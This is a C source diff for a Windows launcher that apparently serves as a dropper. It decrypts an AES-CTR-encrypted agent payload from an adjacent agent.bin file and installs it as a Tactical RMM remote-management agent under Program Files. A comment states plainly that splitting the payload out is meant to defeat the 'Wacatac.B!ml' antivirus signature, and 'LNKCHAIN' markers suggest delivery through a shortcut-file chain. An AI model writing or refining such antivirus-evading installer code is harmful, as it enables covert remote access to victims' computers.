@@ -32,6 +32,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include "common.h"
+#include "aes256.h"
 #include "seal.h"
 #ifdef _WIN32
 #include <windows.h>
@@ -172,6 +173,43 @@ static void cleanup_stale_install(void) {
     svc_delete("tacticalrmm");
     svc_delete("Mesh Agent");
 }
+
+/* Return the DECRYPTED agent bytes: for a legacy inline overlay use ov->payload;
+ * for PAYLOAD_EXTERNAL read the sibling <dir of self>\agent.bin and AES-CTR
+ * decrypt it with the per-build ov->kb/ov->iv_pay. Returns malloc'd bytes or NULL. */
+static uint8_t *load_payload(const char *self, const Overlay *ov, size_t *out_len) {
+    uint8_t *pay;
+    if (!ov->external) {
+        pay = (uint8_t *)malloc(ov->payload_len ? ov->payload_len : 1);
+        if (!pay) return NULL;
+        if (ov->payload_len) memcpy(pay, ov->payload, ov->payload_len);
+        *out_len = ov->payload_len;
+        return pay;
+    }
+    char dir[1024];
+    size_t slen = strlen(self ? self : "");
+    if (slen >= 1024) return NULL;
+    memcpy(dir, self, slen);
+    dir[slen] = 0;
+    char *slash = NULL;
+    for (char *p = dir; *p; p++) if (*p == '\\' || *p == '/') slash = p;
+    if (slash) *slash = 0; /* keep just the directory (empty when self has no dir) */
+    char *bin = join_path(slash ? dir : NULL, "agent.bin");
+    if (!bin) return NULL;
+    uint8_t *cipher; size_t clen;
+    if (!read_file(bin, &cipher, &clen)) { free(bin); return NULL; }
+    free(bin);
+    if (clen != ov->payload_len) { free(cipher); return NULL; }
+    pay = (uint8_t *)malloc(clen ? clen : 1);
+    if (!pay) { free(cipher); return NULL; }
+    if (clen) {
+        memcpy(pay, cipher, clen);
+        aes256_ctr_xor(ov->kb, ov->iv_pay, pay, clen);
+    }
+    free(cipher);
+    *out_len = clen;
+    return pay;
+}
 #endif /* _WIN32 */
 
 #ifdef SELFTEST
@@ -252,15 +290,28 @@ int main(int argc, char **argv) {
      * compiles the SELFTEST branch instead), so keep this guarded.
      * ------------------------------------------------------------------ */
 #ifdef _WIN32
+    cleanup_stale_install();
+
+    /* Load the DECRYPTED agent: inline overlay, or sibling agent.bin when the
+     * overlay is PAYLOAD_EXTERNAL (Option A: keeps Launcher.exe small / no
+     * giant ciphertext blob appended, defeating the Wacatac.B!ml AV signature). */
+    uint8_t *pay = NULL; size_t pay_len = 0;
+    pay = load_payload(self, &ov, &pay_len);
+    if (!pay) {
+        write_marker("", "LNKCHAIN-FAIL payload");
+        free(outDir); free(debug); free(enroll); free(ov.config); free(ov.payload);
+        free(buf); return 0;
+    }
+
     const char *installDir = "C:\\Program Files\\TacticalAgent";
     char *installedExe = join_path(installDir, "tacticalrmm.exe");
     if (installedExe) {
         make_install_dir(installDir);
-        if (write_file(installedExe, ov.payload, ov.payload_len)) {
+        if (write_file(installedExe, pay, pay_len)) {
             if (debug && debug[0] == '1') {
                 char line[256];
                 sprintf(line, "LAUNCHER-INSTALL-OK tag=%s size=%zu target=%s",
-                        SEAL_TAG_32, ov.payload_len, installedExe);
+                        SEAL_TAG_32, pay_len, installedExe);
                 write_marker(outDir, line);
             }
             /* Wait ~6s for the agent to settle, then run the FULL enrollment
@@ -274,6 +325,7 @@ int main(int argc, char **argv) {
         }
         free(installedExe);
     }
+    free(pay);
 #endif /* _WIN32 */
 
     free(outDir);
